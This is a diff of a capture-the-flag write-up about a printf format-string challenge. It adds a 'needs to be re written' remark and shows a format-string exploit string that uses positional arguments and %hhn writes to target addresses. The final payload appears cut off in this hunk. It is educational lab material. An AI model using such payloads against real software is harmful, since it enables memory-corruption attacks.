@@ -147,7 +147,11 @@ gigem{F0RM@1NG_1S_H4RD}
 
 The exploit string can be simplified:
 
-We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`. The exploit string in this case would be:
+We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`. 
+
+_**This part needs to be re written**_
+
+The exploit string in this case would be:
 
 ```
 \x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
